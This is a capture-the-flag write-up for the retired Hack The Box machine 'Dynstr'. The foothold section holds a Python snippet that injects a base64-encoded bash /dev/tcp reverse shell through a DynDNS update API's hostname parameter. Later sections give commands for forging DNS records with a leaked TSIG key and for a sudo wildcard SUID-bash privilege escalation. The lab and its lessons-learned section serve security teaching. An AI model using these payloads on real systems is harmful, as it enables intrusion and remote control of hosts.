# Dynstr

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Medium |
| **IP Address** | 10.10.10.244 |
| **Status** | Retired |

## Overview
Dynstr is a medium-difficulty Linux machine hosting a blog offering Dynamic DNS services. The DynDNS-style update API is vulnerable to OS command injection, which is used to gain an initial `www-data` foothold. From there, an internal support archive leaks an SSH private key for a second user, and abusing dynamic DNS zone updates allows pivoting to an internal host reachable only via a DNS-based route. A wildcard injection in a privileged BIND management script is finally leveraged to escalate to root.

## Reconnaissance
Nmap identified three open services:

```
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
53/tcp  open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
80/tcp  open  http    Apache httpd 2.4.41 (Ubuntu): "Dyna DNS"
```

The web root pointed to `dyna.htb`, and directory brute-forcing revealed a `/nic` path, mimicking real-world Dynamic DNS providers such as No-IP / Dyn.

## Enumeration
The page content and gobuster results referenced several Dynamic DNS-branded hostnames (`dnsalias.htb`, `dynamicdns.htb`, `no-ip.htb`) and leaked shared credentials for the DynDNS API:

```
Username: dynadns
Password: sndanyd
```

Researching the real Dyn/No-IP "remote access update" API documentation showed the expected endpoint format `/nic/update?hostname=<host>&myip=<ip>`. Testing this against `dyna.htb` with HTTP Basic authentication (`dynadns:sndanyd`) confirmed the endpoint was live and echoed back the submitted IP, indicating the value was processed server-side (likely shelled out to update DNS records).

## Foothold
Because the `hostname` parameter appeared to be passed into a shell command that updates DNS zone files, a command injection payload was crafted using command substitution and a base64-encoded reverse shell to avoid character filtering:

```python
# files/dyndns_update_exploit.py
revShell = f'bash -i &>/dev/tcp/{ip}/{port} <&1'
b64 = base64.b64encode(revShell.encode()).decode()

requests.get(
    f'http://10.10.10.244/nic/update?hostname=`echo "{b64}" | base64 -d | bash`"rsflipflop.no-ip.htb&myip={ip}&offline=YES',
    auth=HTTPBasicAuth('dynadns', 'sndanyd')
)
```

Requesting this endpoint while listening with `nc -lvnp <port>` returned a reverse shell as `www-data`.

## Privilege Escalation
Enumerating `/etc/passwd` revealed additional local users `dyna` and `bindmgr`. A support-ticket directory under `/home/bindmgr/support-case-C62796521` contained `strace` session logs left over from a debugging session (`strace-C62796521.txt`). These logs captured a `curl sftp://` transfer authenticated with an SSH key, and the full contents of `bindmgr`'s private key (`id_rsa`) were leaked in the syscall trace buffer.

Using the recovered key to inspect `bindmgr`'s `authorized_keys` showed a `from="*.infra.dyna.htb"` restriction, meaning any host resolving under that subdomain could authenticate as `bindmgr`. Since BIND was configured with a dynamic-update key (`infra.key`, TSIG `hmac-sha256`), a new DNS `A` record could be registered under `infra.dyna.htb` pointing at the attacker's IP:

```
nsupdate -k infra.key
> update add flipflop.infra.dyna.htb 86400 A 10.10.14.202
> send
```

SSH access as `bindmgr` was then obtained against the newly registered hostname:

```
ssh -i id_rsa bindmgr@flipflop.infra.dyna.htb
```

`bindmgr` could run `/usr/local/bin/bindmgr.sh` via `sudo`. The script iterated over `*` in the current directory and copied matching files into BIND's configuration directory before running `named-checkconf`. Since the glob was unfiltered, a malicious working directory containing a SUID-bit copy of `bash` could be staged, and the script's insecure `cp --preserve=mode` behavior preserved the SUID bit on the copied binary:

```bash
mkdir /tmp/.rsff && cd /tmp/.rsff
cp /bin/bash .
chmod +s bash
echo "123123123" > .version
sudo /usr/local/bin/bindmgr.sh
/etc/bind/named.bindmgr/bash -p
```

This yielded a root shell, allowing `root.txt` to be read.

## Lessons Learned
- Dynamic DNS-style update endpoints that shell out to system utilities must strictly validate/allowlist hostname input to prevent command injection.
- Debugging artifacts (`strace`, `script`, `.timing` logs) can inadvertently capture and leak sensitive material such as private keys: these should never be left accessible on production systems.
- SSH `authorized_keys` restrictions based on reverse-DNS/hostname patterns (`from="*.domain"`) are only as strong as the DNS infrastructure backing them; if DNS records can be forged (e.g., via TSIG key disclosure), the restriction can be bypassed.
- Scripts run via `sudo` that operate on wildcard-matched files in a working directory are a classic path to privilege escalation: always use fixed, validated file lists and avoid `--preserve=mode` when copying from untrusted sources.

## Tools & References
- Custom Python exploit for the DynDNS command injection: `files/dyndns_update_exploit.py`
- `nsupdate` (BIND dynamic update client) used for DNS record injection via leaked TSIG key
- The following files were removed from this repository for hygiene (loot/binary material, not needed to understand the writeup):
  - `id_rsa`, `id_rsa.pub`, `id_rsa.public`, `id_rsa_pub.bak`, `key`: SSH key material recovered/used during the attack.
  - `Writeup/Pictures/`: screenshots taken during the original playthrough (Foothold/Root/User stages), superseded by this written narrative.
